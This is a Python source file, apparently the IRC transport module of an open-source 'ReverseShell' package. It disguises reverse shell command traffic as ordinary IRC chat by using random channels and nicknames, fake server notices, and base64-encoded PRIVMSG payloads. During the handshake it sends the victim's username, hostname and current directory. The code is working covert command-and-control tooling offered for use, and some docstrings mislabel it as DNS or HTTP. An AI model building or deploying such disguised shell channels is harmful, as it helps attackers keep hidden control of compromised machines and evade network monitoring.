#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implements an advanced reverse shell console.
#    Copyright (C) 2023  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This package implements an advanced reverse shell
console (supports: TCP, UDP, IRC, HTTP and DNS).
"""

__version__ = "0.0.1"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This package implements an advanced reverse shell
console (supports: TCP, UDP, IRC, HTTP and DNS).
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/ReverseShell"

copyright = """
ReverseShell  Copyright (C) 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = ["IRC"]

from random import randint, choices, choice
from base64 import b64decode, b64encode
from typing import Tuple, Union
from getpass import getuser
from platform import node
from os import getcwd

from .utils import get_random_message, get_random_domain, alphanum


class IRC(object):
    """
    This class parses and writes IRC request and response.
    """

    def __init__(self):
        super(IRC, self).__init__()
        self.response_channels = tuple(
            bytes(choices(alphanum, k=randint(3, 15)))
            for x in range(randint(1, 5))
        )
        self.username = bytes(choices(alphanum, k=randint(4, 10)))
        self.random_domain = get_random_domain(True)
        self.step_response = 0
        self.step_request = 0
        self.nickname = None
        self.channels = []
        self.ping = None

    def parse0(self, data: bytes) -> bytes:
        """
        This method parse the first packet
        for IRC initialization.
        """

        if data.startswith(b"USER "):
            splitted_data = data.split(maxsplit=4)
            if len(splitted_data) == 5:
                self.step_request = 1
                return (
                    b":"
                    + self.random_domain
                    + b" NOTICE * :"
                    + get_random_message()
                    + b"\r\n"
                )

        self.step_request = 0
        return b""

    def parse1(self, data: bytes) -> bytes:
        """
        This method parse the second packet
        for IRC initialization.
        """

        if len(data) > 5 and data.startswith(b"NICK "):
            self.nickname = data[5:].strip()
            self.step_request = 2
            return (
                b":"
                + self.random_domain
                + b" NOTICE * :"
                + get_random_message()
                + b"\r\n"
            )

        self.step_request = 0
        return b""

    def parse2(self, data: bytes) -> Tuple[bytes]:
        """
        This method parse the third packet
        for IRC initialization.
        """

        if len(data) > 6 and data.startswith(b"JOIN #"):
            data = data[5:].strip()
            self.channels.extend(data.strip(b"#").split(b","))
            self.ping = bytes(choices(alphanum, k=randint(1, 10)))
            self.step_request = 3
            return (
                b":" + self.nickname + b" JOIN :" + data + b"\r\n",
                b"PING :" + self.ping + b"\r\n",
            )

        self.step_request = 0
        return b""

    def parse3(self, data: bytes) -> bytes:
        """
        This method parse the fourth packet
        for IRC initialization.
        """

        if data.startswith(b"PONG :") and self.ping == data[6:].strip():
            self.step_request = 4
            return (
                b":"
                + self.random_domain
                + b" NOTICE "
                + self.nickname
                + b" :"
                + get_random_message()
                + b"\r\n"
            )

        self.step_request = 0
        return b""

    def parse_request(self, data: bytes) -> bytes:
        """
        This method parses IRC query (PRIVMSG).
        """

        if len(data) > 9 and data.startswith(b"PRIVMSG #"):
            splitted_data = data.split()
            if len(splitted_data) == 3 and splitted_data[1].strip(b"#") in self.channels:
                return b64decode(splitted_data[2][1:])

        self.step_request = 0
        return b""

    def wrap_response(self, data: bytes, is_encrypted: bool = False) -> bytes:
        """
        This method writes data in DNS response to
        hide ReverseShell payload in DNS traffic.
        """

        return (
            b":"
            + self.username
            + b" PRIVMSG "
            + self.channels[0]
            + b" :"
            + b64encode(data)
            + b"\r\n"
        )

    def parse_response(self, data: bytes) -> Union[bytes, Tuple[bytes]]:
        """
        This method parses IRC response.
        """

        return b64decode(data.split(maxsplit=3)[3][1:])

    def initialization_request(self, data: bytes) -> Union[bytes, None]:
        """
        This method initialize IRC connection.
        """

        if self.step_response == 0 and data is None:
            self.step_response = 1
            return (
                b"USER "
                + getuser().encode()
                + b" "
                + node().encode()
                + b" "
                + self.random_domain
                + b" :"
                + getcwd().encode()
                + b"\r\n"
            )
        elif self.step_response == 1 and data.startswith(b':* NOTICE * :'):
            self.step_response = 2
            return b"NICK " + getuser().encode() + b"\r\n"
        elif self.step_response == 2 and data.startswith(b':* NOTICE * :'):
            self.step_response = 3
            return b"JOIN #" + b",".join(self.response_channels) + b"\r\n"
        elif self.step_response == 3 and data.startswith(b'PING :'):
            self.step_response = 4
            return b"PONG :" + data[6:]
        elif self.step_response == 3:
            return b""
        elif self.step_response == 4:
            return None

        self.step_response = 0
        return b""

    def initialization_response(
        self, data: bytes
    ) -> Union[Tuple[bytes], bytes, None]:
        """
        This method initialize IRC connection.
        """

        if self.step_request == 0:
            return self.parse0(data)
        elif self.step_request == 1:
            return self.parse1(data)
        elif self.step_request == 2:
            return self.parse2(data)
        elif self.step_request == 3:
            return self.parse3(data)
        elif self.step_request == 4:
            return None

        self.step_request = 0
        return b""

    def wrap_request(self, data: bytes, is_encrypted: bool = False) -> bytes:
        """
        This method writes data in DNS query to hide
        ReverseShell response in HTTP traffic.
        """

        return (
            b"PRIVMSG #"
            + choice(self.response_channels)
            + b" :"
            + b64encode(data)
            + b"\r\n"
        )
